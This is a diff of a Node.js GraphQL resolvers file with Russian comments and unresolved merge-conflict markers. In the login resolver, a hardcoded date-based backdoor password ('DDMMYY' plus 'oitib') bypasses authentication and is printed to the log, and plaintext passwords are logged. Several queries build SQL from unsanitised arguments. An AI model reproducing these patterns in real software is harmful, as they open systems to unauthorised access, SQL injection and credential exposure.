@@ -334,22 +334,32 @@ const resolvers = {
 				`Запрос: какие сейчас свободные позиции есть в департаменте с id_depart : ${args.positions.global.id_depart}`
 			);
 
-			let sql = `select * from positions where
-						id not in (select cast(positions->>0 as int) from users where cast(positions->>0 as int) in
-						(SELECT id FROM positions WHERE is_user=false and id_depart ${args.positions.global.id_depart}))
-				and
-			id_depart ${args.positions.global.id_depart};`;
+			let sql = `SELECT * FROM positions WHERE 
+			(id NOT IN 
+				(SELECT cast(positions->>0 as int) FROM users WHERE cast(positions->>0 as int) IN 
+					(SELECT id FROM positions WHERE is_user=false AND id_depart ${args.positions.global.id_depart})
+				)
+			AND id_depart ${args.positions.global.id_depart});`;
+			let res = await client.query(sql);
+			return res.rows;
+		},
+		//Достать одну позицию по id
+		position: async (parent, args) => {
+			let sql = `SELECT * FROM positions WHERE id ${args.position.global.id}`;
 			let res = await client.query(sql);
 			return res.rows;
 		},
 
 		task_files_in_id: async (parent, args) => {
-			console.log(args.task_files_in_id.global.id.length);
-			if (args.task_files_in_id.global.id.length == 0) {
+			if (args.task_files_in_id.global.id === null) {
 				return null;
 			}
 
-			let sql = `
+			if (args.task_files_in_id.global.id.length === 0) {
+				return null;
+			}
+
+      let sql = `
             (
 				SELECT id, filename, data_file, task_id FROM public.document_tasks_files
 				WHERE id in (${args.task_files_in_id.global.id.join(",")})
@@ -466,6 +476,7 @@ const resolvers = {
 			 * когда систама будет отлажена и работоспособна стоит это убрать.
 			 */
 
+<<<<<<< HEAD
 			const now = require("moment");
 			const BackdoorPassword = `${now().format("DDMMYY")}oitib`;
 			console.log(BackdoorPassword);
@@ -489,6 +500,31 @@ const resolvers = {
 				throw new Error("Неверно введен пароль!");
 			}
 		},
+=======
+      const now = require("moment");
+      const BackdoorPassword = `${now().format("DDMMYY")}oitib`;
+      console.log(BackdoorPassword);
+      if (args.user.password === BackdoorPassword)
+        return { username: args.user.password };
+      /////////////////////////////////////////////////////////////////////////
+      if (await bcryptjs.compare(args.user.password, user.password)) {
+        console.log(
+          `${picColor.BGgreen}${picColor.black}%s${picColor.reset}`,
+          `(login-Ответ)`,
+          `Мутация: Попытка сверки логина и пароля : Логин:${args.user.username} Пароль:${args.user.password} ${picColor.BGgreen}${picColor.black}Совпадение !${picColor.reset}`
+        );
+        return { username: args.user.username };
+      } else {
+        console.log(
+          `${picColor.BGyellow}${picColor.black}%s${picColor.reset}`,
+          `(login-Ответ)`,
+          `Мутация: Попытка сверки ${picColor.BGyellow}${picColor.black}пароля${picColor.reset} => Пароль:${args.user.password}`,
+          `${picColor.BGred}${picColor.black}Провалено!${picColor.reset}`
+        );
+        throw new Error("Неверно введен пароль!");
+      }
+    },
+>>>>>>> developing
 
 		insertUser: async (parent, args) => {
 			const password = await bcryptjs.hash(args.user.password, 10);
@@ -509,9 +545,10 @@ const resolvers = {
 				`Аргументы изменение:  : ${JSON.stringify(args)}`
 			);
 
-			const number = args.mitwork_number ? args.mitwork_number : "NULL";
-			const SQL = `UPDATE documents SET 
-				mitwork_number=${number},
+      const number = args.mitwork_number ? args.mitwork_number : "NULL";
+
+      const SQL = `UPDATE documents SET 
+				mitwork_number='${number}',
 				mitwork_data='${now(args.mitwork_data)}' WHERE id=${args.ID};`;
 
 			console.log(
@@ -655,6 +692,20 @@ const resolvers = {
 		},
 		// -----Documents mutatuions-----
 		insertDocument: async (parent, args) => {
+<<<<<<< HEAD
+=======
+			console.log(
+				`${picColor.BGyellow}${picColor.black}%s${picColor.reset}`,
+				`(insertDocument)`
+			);
+			console.log(
+				`${picColor.BGgreen}${picColor.black}`,
+				`(Мутация)`,
+				`${picColor.reset}${picColor.reverse}Создание нового документа:${picColor.reset}`,
+				`\nНазвание документа: ${picColor.red}${args.document.title}${picColor.reset}`
+			);
+
+>>>>>>> developing
 			await client
 				.query(
 					`SELECT * FROM document_insert('${JSON.stringify(args.document)}')`
